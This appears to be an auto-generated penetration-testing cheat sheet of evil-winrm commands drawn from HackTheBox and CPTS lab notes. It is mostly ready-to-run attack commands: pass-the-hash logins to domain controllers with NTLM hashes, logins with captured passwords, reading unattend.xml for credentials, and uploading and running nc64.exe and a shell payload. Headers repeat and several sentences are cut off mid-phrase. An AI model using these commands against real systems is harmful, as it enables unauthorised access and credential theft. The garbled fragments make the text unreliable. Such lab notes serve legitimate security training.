# Evil-winrm

% evil-winrm, winrm, cpts

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - pass-the-hash
#cat/ATTACK/CONNECT #cpts
```
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - exemple-attacking-a-dc
#cat/ATTACK/CONNECT #cpts
We can connect to a target DC using the credentials we captured.

```
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - shadow-credentials-msds-keycredentiallink
#cat/ATTACK/CONNECT #cpts
In this case, we discovered that the victim user is a member of the Remote Management Users group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use Evil-WinRM to

```
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - shadow-credentials-msds-keycredentiallink-2
#cat/ATTACK/CONNECT #cpts
In this case, we discovered that the victim user is a member of the Remote Management Users group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use Evil-WinRM to

```
Evil-WinRM shell v3.7
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - installing-evil-winrm
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
gem install evil-winrm
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
evil-winrm
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu-2
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
Evil-WinRM shell v3.3
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu-3
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu-4
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
c, --pub-key PUBLIC_KEY_PATH Local path to public key certificate
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu-5
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
k, --priv-key PRIVATE_KEY_PATH Local path to private key certificate
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu-6
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
r, --realm DOMAIN Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu-7
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
s, --scripts PS_SCRIPTS_PATH Powershell scripts local path
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - viewing-evil-winrms-help-menu-8
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
e, --executables EXES_PATH C# executables local path
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - connecting-to-a-target-with-evil-winrm-and-valid-credentials
#cat/ATTACK/CONNECT #cpts
Privileged Access

```
evil-winrm -i 10.129.201.234 -u forend
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - workaround-1-pscredential-object
#cat/ATTACK/CONNECT #cpts
We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action. After connecting to a remote host with domain credentials, we import PowerView a

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - workaround-1-pscredential-object-2
#cat/ATTACK/CONNECT #cpts
If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server. Kerberos "Double Hop" Problem

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - workaround-1-pscredential-object-3
#cat/ATTACK/CONNECT #cpts
So now, let's set up a PSCredential object and try again. First, we set up our authentication. Kerberos "Double Hop" Problem

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - workaround-1-pscredential-object-4
#cat/ATTACK/CONNECT #cpts
Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command. Kerberos "Double Hop" Problem

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - workaround-1-pscredential-object-5
#cat/ATTACK/CONNECT #cpts
If we try again without specifying the `-credential` flag, we once again get an error message. Kerberos "Double Hop" Problem

```
get-domainuser -spn | select
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - workaround-1-pscredential-object-6
#cat/ATTACK/CONNECT #cpts
If we try again without specifying the `-credential` flag, we once again get an error message. Kerberos "Double Hop" Problem

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - attack-the-prtg-target-and-gain-remote-code-execution-submit-the-conte
#cat/ATTACK/CONNECT #cpts
Now that students are assured the user has been added successfully, they need to connect to the spawned target machine, such as with `Evil-WinRM`:

```
evil-winrm -i STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - attack-the-prtg-target-and-gain-remote-code-execution-submit-the-conte-2
#cat/ATTACK/CONNECT #cpts
```
└──╼ [★]$ evil-winrm -i 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - attack-the-prtg-target-and-gain-remote-code-execution-submit-the-conte-3
#cat/ATTACK/CONNECT #cpts
```
shell-session
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - another-method-is
#cat/ATTACK/CONNECT #cpts
We are going to use the upload function of evil-winrm to transfer nc64.exe and psgetsys.ps1 over to the remote machine in order to exploit the debug privilege.

```
*Evil-WinRM* PS C:\Users\alaading\Documents> upload nc64.exe
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - another-method-is-2
#cat/ATTACK/CONNECT #cpts
Afterwards, we need to find the PID of an elevated process that we are going to abuse and execute arbitrary commands in its context; `winlogon` usually suffices.

```
*Evil-WinRM* PS C:\Users\alaading\music> ps
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - escalate-privileges-on-the-ms01-host-and-submit-the-contents-of-the-fl
#cat/ATTACK/CONNECT #cpts
```
└──╼ [★]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - escalate-privileges-on-the-ms01-host-and-submit-the-contents-of-the-fl-2
#cat/ATTACK/CONNECT #cpts
```
*Evil-WinRM* PS C:\Users\backupadm\Documents> type C:\panther\unattend.xml
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control
#cat/ATTACK/CONNECT #cpts
```
└──╼ [★]$ proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control-2
#cat/ATTACK/CONNECT #cpts
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--2
#cat/ATTACK/CONNECT #cpts
```
└──╼ [★]$ evil-winrm -i 127.0.0.1 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--3
#cat/ATTACK/CONNECT #cpts
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig /all
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--4
#cat/ATTACK/CONNECT #cpts
```
Evil-WinRM* PS C:\Users\Administrator\Documents> 1..100 | % {"172.16.9.$($_): $(Test-Connection -count 2 -comp 172.16.9.$($_) -quiet)"}
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--5
#cat/ATTACK/CONNECT #cpts
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload "/home/htb-ac413848/dc_shell.exe"
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--6
#cat/ATTACK/CONNECT #cpts
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - fluffy
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: fluffy

```
evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb *Evil-WinRM* PS
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - fluffy-2
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: fluffy

```
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb *Evil-WinRM* PS
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - tombwatcher
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: tombwatcher

```
evil-winrm -i dc01.tombwatcher.htb -u john -p rogue
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - tombwatcher-2
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: tombwatcher

```
evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - voleur
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: voleur

```
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - redelegate
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: redelegate

```
evil-winrm -i redelegate.vl -u HELEN.FROST -p 'Password1!'
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - redelegate-2
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: redelegate

```
evil-winrm -i redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - freelancer
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: freelancer

```
evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - freelancer-2
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: freelancer

```
evil-winrm -i freelancer.htb -u liza.kazanof -p 'Passw0rd!'
```

## Evil-winrm - Evil-winrm - Evil-winrm - Evil-winrm - freelancer-3
#cat/ATTACK/CONNECT #cpts
extrait du PDF Joplin: freelancer

```
evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290 - *Evil-WinRM* PS
```

